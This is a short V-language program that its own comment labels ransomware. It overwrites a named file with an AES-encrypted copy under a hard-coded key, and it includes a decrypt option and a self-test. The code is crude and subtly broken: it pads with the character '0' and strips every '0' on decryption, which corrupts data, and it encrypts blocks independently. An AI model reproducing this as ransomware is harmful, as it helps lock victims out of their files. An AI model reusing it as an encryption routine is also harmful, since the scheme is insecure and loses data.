import os
import crypto.aes
import crypto.cipher
import os.cmdline

/*
Features:
- Will encrypt empty files
- Potentially can increase the size of file if filesize isn't divisible by aes.block_size (16)
- If original file has null byte for some reason, it will get deleted in decryption
- Only works with files, no directories
- Reads only first option and argument
- Data loss is possible, must only encrypt or decrypt once.
    - i.e can do ./ransomwvre -d test/enc.txt twice consecutive or data loss is eminent (same goes for encryption)
*/


// cipher: sets up cipher for the encryption and decryption
fn cipher(key string) cipher.Block {
    return aes.new_cipher(key.bytes())
}

// enc: handles encryption of a single file
fn enc(ciphr cipher.Block, file string) string {
    f := os.read_file(file) or {
        return err.msg
    }

    mut fbyte := f.bytes() 

    // nullpad determines what how many bytes are needed to be a complete block
    nullpad := aes.block_size - (fbyte.len % aes.block_size)

    if nullpad != 0 {
        // appends null bytes until data is divisible by block_size
        fbyte << []byte{len: nullpad, init: '0'.byte()}
    }
    // println(fbyte.len)

    mut encrypted := []byte{len: fbyte.len, init: 0}
    
    if fbyte.len > 16 {
        loops := fbyte.len / aes.block_size
        // ensure all blocks (not only the first) is encrypted
        for i in 0..loops {
            start := 0 + (16*i) // 0, 16, 32
            end := 16 + (16*i)  // 16, 32, 48
            // end is not inclusive, so don't have to worry about encryption overlap
            ciphr.encrypt(mut encrypted[start..end],fbyte[start..end])
        }
    } else {
        ciphr.encrypt(mut encrypted, fbyte)
    }
    return encrypted.bytestr()
}

// dec: handles decryption of a single file
fn dec(ciphr cipher.Block, file string) string {
    f := os.read_file(file) or {
        return err.msg
    }

    mut fbyte := f.bytes()
    mut decrypted := []byte{len: fbyte.len, init: 0}

    loops := fbyte.len / aes.block_size
    // decrypt every block
    for i in 0..loops {
        start := 0 + (16*i) // 0, 16, 32
        end := 16 + (16*i)  // 16, 32, 48
        ciphr.decrypt(mut decrypted[start..end], fbyte[start..end])
    }

    // filter out all null byte characters to get original text
    decr := decrypted.filter(it != '0'.byte())

    return decr.bytestr()
}

// deftest : 
fn deftest(debug bool) {

    // Test Files
    file := 'test/file3.txt' // can change this to test functionality
    out_file := 'test/enc.txt' 
    tin_file := 'test/dec.txt'

    // file 
    f := os.read_file('$file') or {
        println(err)
        panic(err)
    }


    // create cipher from characters with len(bytes) == 32 for aes-256
    ciphr := cipher("????????????????????????????????")
    
    // Encryption 
    encrypted := enc(ciphr, '$file')
    os.write_file('$out_file', encrypted) or {
        println(err)
        panic(err)
    }

    g := os.read_file('$out_file') or {
        println(err.msg)
        panic(err)
    }

    // Decryption
    decrypted := dec(ciphr, out_file)
    os.write_file('$tin_file', decrypted) or {
        println(err)
        panic(err)
    }

    k := os.read_file('$tin_file') or {
        println(err)
        panic(err)
    }

    if debug {
        println("$f")
        // Encryption
        println("-------------------------------------")
        println("$g")

        // Decryption
        println("=====================================")
        println("$k")

    }
}


// main : handles command line arguments + does the dipp
fn main() {

    files := cmdline.only_non_options(os.args)[1..]
    options := cmdline.only_options(os.args)

    if files.len < 1 {
        if options.len < 1 {
            println('+++++++++++++++++++++++++++++++++++++++++')
            println('               Test Case                 ')
            println('+++++++++++++++++++++++++++++++++++++++++\n')
            deftest(true)
            println('+++++++++++++++++++++++++++++++++++++++++\n')
        }
        println("Be sure to enter both a file and option via command line arg")
    } else {
        
        ciphr := cipher("????????????????????????????????")

        if '-d' == options[0] {
            decrypted := dec(ciphr, files[0])
            os.write_file(files[0], decrypted)?
        }

        if '-x' == options[0] {
            encrypted := enc(ciphr, files[0])
            os.write_file(files[0], encrypted)?
        }
    }
}